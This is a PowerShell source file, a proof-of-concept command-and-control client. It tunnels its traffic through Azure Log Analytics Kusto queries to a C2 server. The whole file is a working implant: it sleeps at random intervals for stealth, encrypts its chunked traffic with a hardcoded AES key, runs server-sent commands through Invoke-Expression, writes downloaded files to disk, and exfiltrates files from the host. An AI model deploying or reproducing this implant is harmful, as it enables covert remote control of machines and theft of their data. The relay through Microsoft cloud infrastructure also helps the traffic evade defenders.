# Kusto C2 Client PoC (@0xd13a)

# Minimum and maximum delay between requests, in seconds; increase for more stealth
Param([int]$MinDelay = 1, [int]$MaxDelay = 2)

# To run the client set up the following values
# (Setup instructions can be found at https://techcommunity.microsoft.com/t5/azure-sentinel/access-azure-sentinel-log-analytics-via-api-part-1/ba-p/1248377 )
$TENANT_ID = "" 
$LOGGING_CLIENT_ID = ""
$LOGGING_SECRET = ""
$LOG_ANALYTICS_WORKSPACE = ""

# Server site address (make sure it has a subdomain, e.g. c2.exploitserver.com), port can be omitted
$KUSTO_SERVER = "http://C2_SERVER:C2_PORT/threat-db/search={0}"
# Test server. Empty initially, for testing set it to something like "http://127.0.0.1:65333/threat-db/search={0}", in which case none of the 
#   Azure ID setup above is necessary
$TEST_SERVER = ""

# Pre-shared encryption key
$ENCRYPT_KEY = 0x47, 0xb6, 0x0c, 0x67, 0xcb, 0x1a, 0xd1, 0x57, 0x7a, 0x7b, 0x51, 0x24, 0x75, 0xc2, 0xea, 0x2f, 
               0x6e, 0xe1, 0x17, 0x3e, 0xaa, 0x60, 0x9e, 0xe8, 0x1a, 0x58, 0x5b, 0x79, 0x73, 0x41, 0x82, 0x46

# Server response opcodes
$RESP_OP_STANDBY  = 0  # No-op
$RESP_OP_EXECUTE  = 1  # Execute a command
$RESP_OP_DOWNLOAD = 2  # Download file to the client
$RESP_OP_EXFIL    = 3  # Exfiltrate file to server

# Client request codes 
$REQ_OP_PING     = 0   # Hertbeat ping
$REQ_OP_CONTINUE = 1   # Reserved
$REQ_OP_RESEND   = 2   # Reserved
$REQ_OP_DATA     = 3   # Data (file contents, command output, etc)
$REQ_OP_RESULT   = 4   # Command execution result (1 - success, 0 - failure)

# Max request size that will fit in the URL (arbitrary limit, wanted to avoid having extra long requests)
$REQ_CHUNK_SIZE  = 500

$REQUEST_TIMEOUT = 10   # Number of seconds to wait before declaring request timed out

# Authentication token
$script:connectionAuth = $null

# Connect to Azure and request token
function ConnectAzure() {
	# Only connect if not connected before
	if ($script:connectionAuth -eq $null) {
		$authbody = @{grant_type = "client_credentials"; resource = "https://api.loganalytics.io"; client_id = $LOGGING_CLIENT_ID; client_secret = $LOGGING_SECRET }
		$url = "https://login.microsoftonline.com/$TENANT_ID/oauth2/token"
		try {
			$oauth = Invoke-RestMethod -TimeoutSec $REQUEST_TIMEOUT -Method Post -Uri $url -Body $authBody
		} catch {
			Write-Host "Error sending request: " $TEST_SERVER
    		Write-Host "StatusCode: " $_.Exception.Response.StatusCode.value__ 
    		Write-Host "StatusDescription: " $_.Exception.Response.StatusDescription
			return
		}	
		$script:connectionAuth = @{'Authorization' = "$($oauth.token_type) $($oauth.access_token)" }
	}
}

# Send request over HTTP
function SendRequest([string]$req) {

	Start-Sleep -Seconds (Get-Random -Minimum $MinDelay -Maximum $MaxDelay) 

	# If test server is not set up do the real thing
	if ([string]::IsNullOrEmpty($TEST_SERVER)) {
		ConnectAzure

		if ($script:connectionAuth -eq $null) {
			return $null
		}

		$query = "externaldata(hashes:string) [h@'$KUSTO_SERVER']" -f $req
		$url = "https://api.loganalytics.io/v1/workspaces/$LOG_ANALYTICS_WORKSPACE/query?query="+ 
				[System.Web.HTTPUtility]::UrlEncode($query)
				
		try {
			$result = Invoke-RestMethod -TimeoutSec $REQUEST_TIMEOUT -method Get -uri $url -Headers $script:connectionAuth
		} catch {
			Write-Host "Error sending request: " $PSItem.Exception.Message
			return $null
		}	

		$count = $result.tables.rows.Count
		if ($count -le 0) {
			return $null
		}

		# Decode response
		$data = @()
		foreach ($row in $result.tables.rows) {
        	$data += [byte[]] -split ($row[0] -replace '..', '0x$& ')
	    }
	} else {
		# Send request to test server
		$url = $TEST_SERVER -f $req
		try {
			$response = Invoke-WebRequest -Uri $url
		} catch {
			return $null
		}	
		# Decode response
		$data = [byte[]] -split (($response -replace "`n","") -replace '..', '0x$& ')
	}
	return $data
}

# Encrypt data 
function Encrypt([byte[]]$bytesToBeEncrypted) {
    [System.IO.MemoryStream] $memoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AES = New-Object System.Security.Cryptography.RijndaelManaged
    $AES.KeySize = 256;
    $AES.BlockSize = 128;
    $AES.Key = $ENCRYPT_KEY
    $AES.GenerateIV();
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $AES.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
	try {
		$cryptoStream.Write($bytesToBeEncrypted, 0, $bytesToBeEncrypted.Length);
		$cryptoStream.Close();
	} catch [Exception] {
		return @()
	}	
    return $AES.IV + $memoryStream.ToArray();
}

# Decrypt data
function Decrypt([byte[]]$bytesToDecrypt) {
    [System.IO.MemoryStream] $memoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.RijndaelManaged] $AES = New-Object System.Security.Cryptography.RijndaelManaged
    $AES.KeySize = 256;
    $AES.BlockSize = 128;
    $AES.Key = $ENCRYPT_KEY
    $AES.IV = $bytesToDecrypt[0..15]
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
	$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $AES.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
	try {
		$cryptoStream.Write($bytesToDecrypt, 16, $bytesToDecrypt.Length-16)
		$cryptoStream.Close()
	} catch [Exception] {
		return @()
	}
	return $memoryStream.ToArray();
}

# Convert string to byte array and add a length in front
function SerializeStr([string]$value) {
	$val = [System.Text.Encoding]::UTF8.GetBytes($value) 
	return @($val.Length) + $val
}

# Convert data array back to string
function DeserializeStr([byte[]]$value) {
	return [System.Text.Encoding]::UTF8.GetString($value[1..$value[0]])
}

# Compress data
function Compress([byte[]]$byteArray) {
	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
	$gzipStream.Write($byteArray, 0, $byteArray.Length)
	$gzipStream.Close()
	$output.Close()
	return $output.ToArray()
}

# Decompress data
function Decompress([byte[]] $byteArray) {
	$input = New-Object System.IO.MemoryStream( , $byteArray)
	$output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	$gzipStream.CopyTo($output)
	$gzipStream.Close()
	$input.Close()
	return $output.ToArray()
}

# Send request to server, splitting it up, encrypting and encoding it
function SendData([byte]$type, [byte[]] $data) {
	# Split up the request
	for ($i = 0; $i -lt $data.length -or $data.length -eq 0; $i += $REQ_CHUNK_SIZE) {

		if (($data.length - $i) -gt $REQ_CHUNK_SIZE) {
			$chunkSize = $REQ_CHUNK_SIZE
		} else {
			$chunkSize = $data.length - $i
		}

		# Build request, adding type, and sizes and counters to it
		$chunk = @($type)
		$chunk += [System.BitConverter]::GetBytes([uint32]$data.length)
		$chunk += [System.BitConverter]::GetBytes([uint32]$i)
		$chunk += [System.BitConverter]::GetBytes([uint32]$chunkSize)
		
		if ($chunkSize -gt 0) {
			$chunk += $data[$i..($i + $chunkSize - 1)]
		}
		
		# Encrypt chunk
		$encryptedChunk = Encrypt $chunk

		# Encode chunk as Base64
		$encoded = [Convert]::ToBase64String($encryptedChunk)
		$encoded = ($encoded -replace "/","-") 

		$response = SendRequest $encoded 
		if ($response -eq $null) {
			return $false
		}

		# Process response
		$parsed = DecodeResponse $response

		# Do just one iteration for empty blocks
		if ($data.length -eq 0) {
			break
		}
	}
	return $true
}

# Execute OS command
function ExecuteCommand([byte[]] $data) {
	$cmd = [System.Text.Encoding]::ASCII.GetString($data[5..$data.length])

	Write-Host "Executing command:" $cmd

	try {
		$output = Invoke-Expression ($cmd+" 2>&1") | Out-String
	} catch {
		$output = $PSItem.Exception.Message
	}

	$bytes = [System.Text.Encoding]::UTF8.GetBytes($output)

	# Compress output to save space
	$compressed = Compress $bytes
	$result = SendData $REQ_OP_DATA $compressed
	if ($result -eq $false) {
		Write-Host "Error sending command results"
	}
}

# Download file from the server
function DownloadCommand([byte[]] $data) {
	$nameSize = [System.BitConverter]::ToUInt32($data[1..5],0)
	$name = [System.Text.Encoding]::ASCII.GetString($data[5..(5+$nameSize-1)])

	$uncompressed = Decompress $data[(5+$nameSize+4)..$data.length]

	Write-Host "Downloading file:" $name

	# Resolve destination name
	$name = Resolve-Path $name -ErrorAction SilentlyContinue -ErrorVariable _frperror
    if (-not($name)) {
        $name = $_frperror[0].TargetObject
    }

	try {
		[System.IO.File]::WriteAllBytes($name, $uncompressed)
		$response = SendRequest (BuildCommandResultRequest 1)
	} catch {
		Write-Host $PSItem.Exception.Message
		$response = SendRequest (BuildCommandResultRequest 0)
	}
}

# Exfiltrate file from the client
function ExfilCommand([byte[]] $data) {
	$name = [System.Text.Encoding]::ASCII.GetString($data[5..$data.length])

	Write-Host "Exfiltrating file:" $name

	# Resolve the name
	$name = Resolve-Path $name -ErrorAction SilentlyContinue -ErrorVariable _frperror
    if (-not($name)) {
        $name = $_frperror[0].TargetObject
    }

	$fileData = @()

	try {
		$fileData = [System.IO.File]::ReadAllBytes($name)
	} catch {
		Write-Host $PSItem.Exception.Message
	}

	# Compress data to save space
	$compressed = Compress $fileData
	$result = SendData $REQ_OP_DATA $compressed
	if ($result -eq $false) {
		Write-Host "Error sending command results"
	}
}

# Decode response chunk
function DecodeResponse([byte[]] $data) {
	$decrypted = Decrypt $data

	if ($decrypted.length -eq 1) {
		$final = $true
		$data = @()
	} else {
		$total = [System.BitConverter]::ToUInt32($decrypted[1..5],0) 
		$pos = [System.BitConverter]::ToUInt32($decrypted[5..9],0) 
		$size = [System.BitConverter]::ToUInt32($decrypted[9..13],0) 
		$final = $total -le ($pos + $size)
		$data = @($decrypted[13..$decrypted.length])
	}
	
	$resp = @{
		Type = $decrypted[0];
		Final = $final;
		Bytes = $data
	}
	return $resp
}

# Build a ping request to the server
function BuildPingRequest() {
	$encrypted = Encrypt @($REQ_OP_PING)
	$encoded =  [Convert]::ToBase64String($encrypted)
	return ($encoded -replace "/","-")
}

# Build a request that conveys result of command execution
function BuildCommandResultRequest([byte]$result) {
	$encrypted = Encrypt @($REQ_OP_RESULT, $result)
	$encoded =  [Convert]::ToBase64String($encrypted)
	return ($encoded -replace "/","-")
}

# Get command to execute from the server
function GetCommand() {
	$data = @()
	while ($true) {
		# Send a ping
		$response = SendRequest (BuildPingRequest)
		if ($response -eq $null) {
			# Display an error indicator
			Write-Host -NoNewline "X`b"
			Start-Sleep -Seconds 0.5 
			Write-Host -NoNewline " `b"
			return $null
		}
		# Display heartbeat indicator because we successfully pinged the server
		Write-Host -NoNewline "$([char]0x2665)`b"
		Start-Sleep -Seconds 0.5 
		Write-Host -NoNewline " `b"

		# Decode response chunk and add it to payload array
		$parsed = DecodeResponse $response
		$data += $parsed.Bytes
		if ($parsed.Final) {
			# Once we received the entire payload - return it
			return @($parsed.Type) + $data
		}
	}
}

$ProgressPreference = 'SilentlyContinue'

Write-Host "Kusto C2 Client (@0xd13a)"

# Main execution loop 
while ($true) {
	# Receive command from the server
	$command = GetCommand

	if ($command -ne $null) {
		switch ($command[0]) {
			$RESP_OP_STANDBY {
				# sleep until we get a real command
			}
			$RESP_OP_EXECUTE {
				ExecuteCommand $command
			}
			$RESP_OP_DOWNLOAD {
				DownloadCommand $command
			}
			$RESP_OP_EXFIL {
				ExfilCommand $command
			}
		}
	}
}
